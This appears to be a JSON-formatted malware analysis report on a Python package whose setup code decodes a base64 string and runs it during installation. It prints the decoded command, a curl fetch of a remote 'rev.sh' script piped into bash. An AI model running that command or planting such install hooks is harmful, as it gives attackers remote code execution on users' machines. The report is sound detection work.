{
  "purpose": "The code decodes a base64-encoded string to retrieve a shell command that fetches and executes a remote script during package installation, indicating malicious intent.",
  "sources": "The base64-encoded string within the notmalfunc() function, decoded and executed via os.system.",
  "sinks": "os.system call executing the decoded command, which runs 'curl -s http://192.168.1.3:8000/rev.sh | bash'.",
  "flows": "The code decodes the base64 string, then passes the resulting command directly to os.system, which executes the remote script during installation.",
  "anomalies": "Use of base64 encoding to obfuscate a remote command, executing it during package setup, and the command's nature (curl to external IP piping into bash) are suspicious behaviors.",
  "analysis": "The script contains a function that decodes a base64 string representing a shell command to fetch and run a remote script. This function is invoked during the install process, leading to remote code execution. The base64 encoding is a common obfuscation technique. The command targets an external IP, indicating potential malicious control. The pattern aligns with supply chain attack vectors, with high severity and risk. The code's behavior is straightforward and clearly malicious, with no benign explanation for executing remote scripts during package installation.",
  "conclusion": "The code is malicious, executing remote code during installation, representing a severe security threat. The obfuscation via base64 is typical but not complex. The behavior aligns with known supply chain attacks, and the scores assigned in the reports (malware: 1.0, obfuscated: 0.8, security risk: 1.0) are justified and consistent.",
